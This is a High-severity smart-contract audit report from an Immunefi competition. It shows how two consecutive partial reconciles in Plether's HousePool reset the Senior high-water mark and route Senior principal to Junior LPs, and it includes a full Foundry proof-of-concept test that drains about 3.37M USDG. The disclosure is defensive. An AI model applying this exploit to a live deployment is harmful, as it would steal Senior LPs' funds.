# \#97891 [SC-High] A second partial recapitalization reconcile resets the Senior high-water mark and moves restored Senior principal to Junior

**Submitted on Nov 3rd 2026 at 19:12:40 UTC by @Nescient for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97891
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

# Description

## Brief/Intro

After a loss wipes both tranches, the documented recovery is an owner recapitalization. The Senior tranche is then protected by its high-water mark: revenue must restore impaired Senior principal before Junior earns anything. When the pending recovery buckets are only partly settleable, two consecutive LP epoch settlements with no change in pool cash break this. The second pass treats the already restored Senior principal as an empty bootstrap, overwrites the high-water mark with a small residual, and credits the rest to Junior. In the PoC, Senior's credited principal falls from 4,875,500 to 1,200,749 USDG with no Senior redemption and no new loss, and a Junior LP redeems 3,374,563 USDG of that value.

## Vulnerability Details

Notation: `S` and `J` are stored Senior and Junior principal, `H` is the Senior high-water mark, `P` is pool cash, `C` is trader claims, `D` is distributable assets, `R` is the owner's recapitalization, and `x` is trading revenue that arrives later.

**Recovery state.** A terminal loss leaves `S = J = 0` while both tranches still have share supply, and `H` keeps Senior's entitlement. The owner calls `CfdEngine.recapitalizePool(R)`. The pool queues `R` as a pending recapitalization bucket. Later trading revenue `x` (for example a losing trader's collected loss) is queued as pending revenue, because stored principal is zero.

**How a reconcile handles pending buckets.** `HousePool._reconcile` does three things:

1. It caps the pending buckets by the current distributable assets (`_settleablePendingClaimantBuckets`).
2. It plans the waterfall with those capped buckets reserved. `HousePoolReconcilePlanLib.planReconcile` subtracts the reserved amount from `distributable` at L68-L71 and absorbs any shortfall against claimed principal as a loss at L102-L104.
3. It applies the settleable buckets to the planned state (`_applyPendingClaimantBucketsLive` → `applyPendingClaimantBucketsPreview`).

**Pass 1 (`P = D = x`, with `R/2 < x < R`).** All of `x` settles as recapitalization, which is Senior-first. Because `S = J = 0`, `applyClaimantRecapitalizationIntent` takes its bootstrap branch and sets `S = x`, `H = max(R, x) = R`. The residual buckets are recapitalization `R - x` and revenue `x`. This state is correct: Senior owns all the cash and is still impaired by `R - x`.

**Pass 2 (nothing changes, `P = D = x`).** The residual buckets total `(R - x) + x = R`. They are capped at `D = x` and reserved, so the plan sees zero distributable against claimed `S = x`. It absorbs that as a loss, setting `S = 0`. The settleable buckets are then applied to this transient state: recapitalization `R - x`, then revenue `2x - R`. Since `S` and `J` now both read zero, the bootstrap branch runs again:

```solidity
// HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent
if (state.seniorSupply > 0) {
    if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
        state.waterfall.seniorPrincipal += remaining;
        state.waterfall.seniorHighWaterMark =
            recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
        remaining = 0;
```

`recapitalizationTargetAssets` is only the residual `R - x`. The existing `H = R` is ignored, so `H` falls to `R - x`.

Revenue is then applied with `allowRevenueContinuation = true`, which `_reconcile` captured from the pre-plan `S = x` at L1567. The Senior gap `H - S` is now zero, so `applyRevenueIntent` credits all `2x - R` to Junior principal.

| | `S` | `H` | `J` |
| --- | --- | --- | --- |
| After pass 2 (actual) | `R - x` | `R - x` | `2x - R` |
| After pass 2 (correct) | `x` | `R` | `0` |

The second pass should be a no-op, because no cash, claim, position or loss changed.

This breaks two documented invariants:

- `SECURITY.md` L394: "Senior impairment must be restored before junior extracts surplus".
- `ACCOUNTING_SPEC.md` L337: "Losses do not reduce the Senior high-water mark".

The corrupted `H` also unlocks Junior exits. The Junior covenant protects `max(S, H)` of Senior exposure. With `H` lowered to `R - x`, about `(2x - R) - ceil((R - x)/4)` becomes withdrawable at the release 80% Senior-share limit.

**This is not the designed post-wipeout reset.** `TrancheRecoveryBehavior.t.sol` L24-L55 asserts that an explicit recapitalization after a full wipeout resets the high-water mark to the recapitalized amount. That reset happens once, to the owner's recapitalization `R`, and pass 1 above performs it correctly (`H = R`). Pass 2 is different in three ways:

- No new recapitalization or other inflow arrives.
- Senior principal that was already credited falls from `x` to `R - x` with no loss event.
- The high-water mark falls below the owner's recapitalization `R`.

The function's own NatSpec defines the target as the "Full recapitalization intent used as the high-water mark on an empty bootstrap" (`HousePoolPendingPreviewLib.sol` L110). The caller instead passes only the remaining pending bucket (L47-L48), which on pass 2 is the residual `R - x`.

**Relation to prior findings.** For a fixed root, the rules require showing that the fix is incomplete or introduces a new bug. This finding shows the fixes below introduce a new bug.

- **SC-L1 (SC Audit Studio pre-audit), fixed.** Its fix made pending recapitalization and revenue "capped to what's actually settleable ... stays reserved everywhere, and gets applied later once it's backed." This finding is a new bug in that fix. On a later pass, the still-pending residual is reserved again against cash that an earlier pass already credited to Senior principal. That reservation is what transiently zeroes Senior principal and sends the reconcile into the bootstrap branch.
- **MED-12 (Cecuro), addressed.** It fixed revenue continuation after recapitalization in this same helper and keeps "partial-settlement residuals" reserved. The re-reservation above happens on that residual path.
- **MED-11 (Cecuro).** It concerns scaling the high-water mark during an actual Senior withdrawal. Here no Senior withdrawal happens.

## Impact Details

The victims are Senior LPs. The PoC uses release parameters and a 12.4M USDG pool. After recovery:

- **Before pass 2:** Senior principal is credited with `x = 4,875,500` USDG and `H = 6,076,249` USDG.
- **Pass 2:** one more permissionless LP epoch settlement, with no cash change, cuts Senior principal and `H` to 1,200,749 USDG. It credits 3,674,751 USDG to Junior.
- **Payout:** the Junior LP's `claimRedeem` transfers **3,374,563 USDG** that belonged to Senior.

The actor needs no role. It is any Junior LP who requests redemption and calls the permissionless Router `settleLpEpoch` in two epochs, observing the ordinary one-hour refund cooldowns. The faulty transfer does not depend on the attacker at all: any two partial settlements move Senior value to Junior holders, and an attentive Junior LP can withdraw it.

**Preconditions:**

- A terminal loss wipes both tranches, followed by the owner's documented recovery (`recapitalizePool`, then `clearDegradedMode`). The owner acts within its documented role. The harm comes from a logic error that this legitimate action triggers.
- Revenue `x` arrives with `R/2 < x < R`.

The code explicitly supports this recovery state: it has a bootstrap branch, pending recapitalization buckets, and the owner-only recapitalization and degraded-mode clearing runbook. The PoC creates the wipeout with a balanced book whose two sides close at the two price endpoints. That path is a feasibility question, not a severity question, under the program rules.

## Recommendation

1. In the bootstrap branch of `applyClaimantRecapitalizationIntent`, never lower an existing high-water mark: `seniorHighWaterMark = max(seniorHighWaterMark, recapitalizationTargetAssets, remaining)`.
2. Do not re-reserve cash that an earlier pass already credited to claimed principal. For example, decide the bootstrap branch from the pre-plan stored principal, or reduce the pending revenue bucket when recapitalization consumes its cash.
3. Add a regression test: two consecutive partial reconciles with unchanged cash must leave `S`, `J` and `H` unchanged.

## References

- [`HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L137), bootstrap branch [L117-L122](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L117-L122)
- [`HousePoolPendingPreviewLib.applyRevenueIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L158-L189)
- [`HousePoolReconcilePlanLib.planReconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L47-L106), bucket reservation [L68-L71](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L71)
- [`HousePool._reconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1598), [`_applyPendingClaimantBucketsLive`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1759-L1776), [`_settleablePendingClaimantBuckets`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834)
- [`CfdEngine.recapitalizePool`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L632) and [`clearDegradedMode`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L658-L667)
- [`SECURITY.md` high-water-mark protection](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L394) and [`ACCOUNTING_SPEC.md` loss rule](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L337)
- [Bootstrap target NatSpec](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L110) and the [caller passing the remaining pending bucket](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L46-L49)
- [Designed one-time post-wipeout reset test](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/TrancheRecoveryBehavior.t.sol#L24-L55)
- [SC Audit Studio pre-audit, SC-L1](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf)

## Proof of Concept

## Proof of Concept

Every trade is a production V3 `OrderRouter.commitOrder(OrderRequest)` followed by a permissionless `OrderRouter.executeOrder`. Every LP epoch settlement is the permissionless Router `settleLpEpoch`, and LP deposits and redemptions use the public vault entry points. The only owner actions are:

- installing the release 40M / 80% Senior limits through the real timelock,
- `recapitalizePool`,
- `clearDegradedMode`.

Only Pyth and USDG are mocked. Risk parameters, the Senior limits, the 800 bps Senior rate and the 1 USDG tranche seeds are the release values. Two inherited fixture defaults differ from release:

- minimum open notional is 100 USDG instead of 1,000;
- the adverse-confidence multiplier is 2,000 bps instead of 2,500.

Neither affects this path. Every order is millions of USDG, and the mocked prices carry zero confidence.

The PoC proceeds as follows:

1. Seed the pool with 12.4M USDG from public deposits.
2. Wipe both tranches with a balanced book whose two sides close at the 0.01 and 2.00 price endpoints.
3. Recapitalize exactly the claim shortfall `R`, then clear degraded mode.
4. Settle one epoch with zero distributable assets, then pay the trader claim.
5. Collect `x` of real revenue from a losing trader.
6. Run the two partial passes.

It asserts that pass 2 drops `H` from `R` to `R - x` and that the Junior LP receives more than 1,000,000 USDG.

Save the following file as `packages/perps/test/perps/regression/SeniorHighWaterMarkReset.t.sol` in the frozen repository:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {console2} from "forge-std/console2.sol";

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

/// Cheatcodes and test helpers used:
/// - MockSettlementToken.mint funds EOAs and the legitimate owner recapitalization; USDG is explicitly mockable.
/// - vm.prank/startPrank act only as ordinary LPs, traders, or a permissionless keeper, never as an in-scope contract.
/// - vm.warp advances only the real 72-hour config delay, one-hour LP epochs, and one-hour redemption cooldowns.
/// - BasePerpTest._mockPythUpdateData advances one block/second and supplies a signed-price mock through the public Router.
/// - BasePerpTest._fundTrader uses the public clearinghouse deposit path.
/// - No vm.store, in-scope-contract impersonation, legacy Router entrypoint, or forged in-scope balance is used.
contract SeniorHighWaterMarkResetPoC is BasePerpTest {
    address internal constant JUNIOR_LP = address(0xA1101);
    address internal constant SENIOR_LP = address(0xA1102);
    address internal constant STRESS_LONG = address(0xA1103);
    address internal constant STRESS_SHORT = address(0xA1104);
    address internal constant DONOR = address(0xA1105);
    address internal constant KEEPER = address(0xA1106);

    uint256 internal constant LOW_PRICE = 1_000_000; // 0.01 basket price, the near-zero endpoint used by the stress closes
    uint256 internal constant MID_PRICE = 1e8;
    uint256 internal constant JUNIOR_ASSETS = 2_500_000e6;
    uint256 internal constant SENIOR_ASSETS = 9_900_000e6;
    uint256 internal constant STRESS_MARGIN = 10_000_000e6;
    uint256 internal constant STRESS_CHUNK = 4_000_000e18;
    uint256 internal constant STRESS_TAIL = 1_300_000e18;
    uint256 internal constant STRESS_SIZE = 9_300_000e18;
    uint256 internal constant DONOR_SIZE = 2_450_000e18;
    uint256 internal constant DONOR_MARGIN = 5_200_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function test_PartialPendingReconcileDeletesSeniorHwmAndPaysJunior() public {
        // Restore BasePerpTest's permissive fixture limits to the release 40M / 80% configuration.
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);

        uint256 attackerShares = _publicDeposit(juniorVault, JUNIOR_LP, JUNIOR_ASSETS, MID_PRICE);
        _publicDeposit(seniorVault, SENIOR_LP, SENIOR_ASSETS, MID_PRICE);
        assertGt(attackerShares, 0);
        assertEq(pool.totalAssets(), JUNIOR_ASSETS + SENIOR_ASSETS + 2e6);

        _fundTrader(STRESS_LONG, 10_500_000e6);
        _fundTrader(STRESS_SHORT, 10_500_000e6);
        _fundTrader(DONOR, 5_500_000e6);

        // Alternation keeps every intermediate skew below 40% of the approximately 12.4M pool.
        _executeV3(STRESS_LONG, CfdTypes.Side.LONG, STRESS_CHUNK, STRESS_MARGIN, false, MID_PRICE);
        _executeV3(STRESS_SHORT, CfdTypes.Side.SHORT, STRESS_CHUNK, STRESS_MARGIN, false, MID_PRICE);
        _executeV3(STRESS_LONG, CfdTypes.Side.LONG, STRESS_CHUNK, 20_000e6, false, MID_PRICE);
        _executeV3(STRESS_SHORT, CfdTypes.Side.SHORT, STRESS_CHUNK, 20_000e6, false, MID_PRICE);
        _executeV3(STRESS_LONG, CfdTypes.Side.LONG, STRESS_TAIL, 20_000e6, false, MID_PRICE);
        _executeV3(STRESS_SHORT, CfdTypes.Side.SHORT, STRESS_TAIL, 20_000e6, false, MID_PRICE);

        // At CAP this contributes 4.9M of SHORT OI, less than 0.4 * 12.4M, and has zero max profit.
        _executeV3(DONOR, CfdTypes.Side.SHORT, DONOR_SIZE, DONOR_MARGIN, false, CAP_PRICE);
        assertEq(pool.pendingTradingRevenueAssets(), 0, "revenue is not queued while stored LP principal exists");

        // Both stress accounts have 10M margin, so neither endpoint transition relies on a liquidation race.
        _executeV3(STRESS_LONG, CfdTypes.Side.LONG, STRESS_SIZE, 0, true, LOW_PRICE);
        assertTrue(engine.degradedMode(), "remaining 9.3M endpoint liability exceeds cash");

        _executeV3(STRESS_SHORT, CfdTypes.Side.SHORT, STRESS_SIZE, 0, true, CAP_PRICE);
        uint256 traderClaim = engine.traderClaimBalanceAssets(STRESS_SHORT);
        uint256 cashBeforeRecap = pool.totalAssets();
        assertGt(traderClaim, cashBeforeRecap, "second endpoint winner must become a claim");
        assertEq(engine.totalTraderClaimBalanceAssets(), traderClaim);

        uint256 recapitalization = traderClaim - cashBeforeRecap;
        settlementToken.mint(address(this), recapitalization);
        settlementToken.approve(address(engine), recapitalization);
        engine.recapitalizePool(recapitalization);
        assertEq(pool.totalAssets(), traderClaim, "owner restores exact aggregate claim backing");

        // The only remaining position entered at CAP and has L=0, so this documented recovery action is legal.
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode());

        // A matured zero-quote request makes the D=0 reconcile persist instead of reverting as no progress.
        (uint256 wipeRequestId,) = _requestAllJunior();
        _warpToLpEpoch(wipeRequestId);
        _settleLpEpochAt(CAP_PRICE);
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertGt(pool.seniorHighWaterMark(), 0, "Senior recovery entitlement survives the real loss");
        assertEq(pool.pendingRecapitalizationAssets(), recapitalization);
        assertEq(pool.pendingTradingRevenueAssets(), 0);
        _claimJuniorRefund(wipeRequestId);

        // Claim payment lowers P and C equally, so terminal distributable value remains zero.
        vm.prank(STRESS_SHORT);
        engine.settleTraderClaim(STRESS_SHORT);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0);
        assertEq(pool.totalAssets(), 0);

        // The donor's real loss is now the pool's only cash and is queued because stored S and J are zero.
        _executeV3(DONOR, CfdTypes.Side.SHORT, DONOR_SIZE, 0, true, LOW_PRICE);
        uint256 revenueCash = pool.totalAssets();
        uint256 queuedRevenue = pool.pendingTradingRevenueAssets();
        assertEq(queuedRevenue, revenueCash, "all post-wipe pool cash is queued donor revenue");
        assertGt(recapitalization, revenueCash, "first pass must apply only part of recapitalization");
        assertGt(2 * revenueCash, recapitalization, "second pass must reach the revenue bucket");
        assertGt(9 * revenueCash, 5 * recapitalization, "release covenant must leave positive Junior capacity");

        uint256 residualRecap = recapitalization - revenueCash;
        uint256 misroutedJunior = 2 * revenueCash - recapitalization;

        // Pass one: D=x is reserved for recapitalization, creating S=x and H=R; Junior still quotes zero.
        (uint256 firstPartialId,) = _requestAllJunior();
        _warpToLpEpoch(firstPartialId);
        _settleLpEpochAt(LOW_PRICE);
        assertEq(pool.totalAssets(), revenueCash);
        assertEq(pool.seniorPrincipal(), revenueCash);
        assertEq(pool.seniorHighWaterMark(), recapitalization);
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(pool.pendingRecapitalizationAssets(), residualRecap);
        assertEq(pool.pendingTradingRevenueAssets(), revenueCash);
        _claimJuniorRefund(firstPartialId);

        // No cash, claim, position, or economic loss changes between the two partial passes.
        assertEq(pool.totalAssets(), revenueCash);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0);

        // Pass two: planReconcile temporarily wipes S. The faulty bootstrap branch writes H=R-x,
        // then allowRevenueContinuation routes 2x-R to Junior and funds this request.
        (uint256 exploitRequestId,) = _requestAllJunior();
        _warpToLpEpoch(exploitRequestId);
        _settleLpEpochAt(LOW_PRICE);

        uint256 fundedShares = juniorVault.claimableRedeemRequest(exploitRequestId, JUNIOR_LP);
        uint256 fundedAssets = juniorVault.claimableRedeemAssets(exploitRequestId, JUNIOR_LP);
        assertGt(fundedShares, 0);
        assertGt(fundedAssets, 1_000_000e6, "material Senior recovery is now claimable by Junior");

        assertEq(pool.seniorPrincipal(), residualRecap);
        assertEq(pool.seniorHighWaterMark(), residualRecap, "fault deletes the existing H=R entitlement");
        assertEq(recapitalization - pool.seniorHighWaterMark(), revenueCash);
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.pendingTradingRevenueAssets(), residualRecap);
        assertEq(pool.juniorPrincipal(), misroutedJunior - fundedAssets);

        uint256 attackerBalanceBefore = settlementToken.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 paid = juniorVault.claimRedeem(exploitRequestId, fundedShares, JUNIOR_LP, JUNIOR_LP);
        assertEq(paid, fundedAssets);
        assertEq(settlementToken.balanceOf(JUNIOR_LP) - attackerBalanceBefore, paid);
        console2.log("R (recapitalization)   :", recapitalization);
        console2.log("x (revenue cash)       :", revenueCash);
        console2.log("Senior HWM after       :", pool.seniorHighWaterMark());
        console2.log("Junior paid            :", paid);
    }

    function _publicDeposit(
        TrancheVault vault,
        address lp,
        uint256 assets,
        uint256 markPrice
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();

        uint256 activationTime = vault.depositEpochStart(requestId);
        if (block.timestamp < activationTime) {
            vm.warp(activationTime); // Ordinary asynchronous LP epoch delay.
        }
        _settleLpEpochAt(markPrice);

        uint256 claimableAssets = vault.claimableDepositRequest(requestId, lp);
        assertEq(claimableAssets, assets);
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, claimableAssets, lp, lp);
    }

    function _executeV3(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 executionPrice
    ) internal returns (uint64 orderId) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(uint256(router.nextCommitId()) + 0x1000);
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = executionPrice;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });

        vm.prank(account);
        orderId = router.commitOrder(request);
        bytes[] memory updateData = _mockPythUpdateData(executionPrice);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(result.orderId, orderId);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _settleLpEpochAt(
        uint256 price
    ) internal {
        bytes[] memory updateData = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.settleLpEpoch(updateData);
    }

    function _requestAllJunior() internal returns (uint256 requestId, uint256 shares) {
        _finishJuniorCooldown();
        shares = juniorVault.balanceOf(JUNIOR_LP);
        assertGt(shares, 0);
        vm.prank(JUNIOR_LP);
        requestId = juniorVault.requestRedeem(shares, JUNIOR_LP, JUNIOR_LP);
    }

    function _claimJuniorRefund(
        uint256 requestId
    ) internal returns (uint256 shares) {
        shares = juniorVault.refundableRedeemRequest(requestId, JUNIOR_LP);
        assertGt(shares, 0, "zero-quote epoch must return the attacker's shares");
        vm.prank(JUNIOR_LP);
        uint256 returnedShares = juniorVault.claimRedeemRefund(requestId, JUNIOR_LP, JUNIOR_LP);
        assertEq(returnedShares, shares);
    }

    function _finishJuniorCooldown() internal {
        uint256 ready = juniorVault.lastDepositTime(JUNIOR_LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < ready) {
            vm.warp(ready); // Ordinary one-hour cooldown after deposit activation or share refund.
        }
    }

    function _warpToLpEpoch(
        uint256 requestId
    ) internal {
        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp < maturity) {
            vm.warp(maturity); // Ordinary one-hour epoch maturation, including the five-minute request cutoff rule.
        }
    }
}

```

Run:

```sh
forge test --root packages/perps \
  --match-path test/perps/regression/SeniorHighWaterMarkReset.t.sol -vv
```

Expected output:

```text
Ran 1 test for test/perps/regression/SeniorHighWaterMarkReset.t.sol:SeniorHighWaterMarkResetPoC
[PASS] test_PartialPendingReconcileDeletesSeniorHwmAndPaysJunior() (gas: 20886950)
Logs:
  R (recapitalization)   : 6076249361262
  x (revenue cash)       : 4875500000000
  Senior HWM after       : 1200749361262
  Junior paid            : 3374563298422

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Values are in USDG atoms (6 decimals): `R` = 6,076,249.36 USDG, `x` = 4,875,500 USDG, Senior high-water mark after pass 2 = 1,200,749.36 USDG (it was `R` after pass 1), Junior paid = 3,374,563.30 USDG.

